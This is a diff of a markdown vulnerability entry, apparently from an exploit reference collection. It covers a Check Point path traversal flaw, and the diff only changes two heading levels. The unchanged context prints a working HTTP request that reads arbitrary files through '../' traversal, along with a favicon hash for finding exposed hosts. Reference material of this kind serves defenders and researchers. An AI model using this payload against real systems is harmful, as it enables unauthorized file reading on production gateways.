@@ -16,7 +16,7 @@ This vulnerability, when taken advantage of, grants the attacker read access to 
 |CloudGuard Network| R81.20, R81.10, R81, R80.40|
 |Check Point Spark|R81.10, R80.20|
 
-# Payload
+### Payload
 ```
 POST /clients/MyCRL HTTP/1.1
 Host: <Host>
@@ -24,7 +24,7 @@ Host: <Host>
 aCSHELL/../../../../../../../<File>
 ```
 
-# Lookup Methods
+### Lookup Methods
 > Favicon Hash: 794809961
 
 
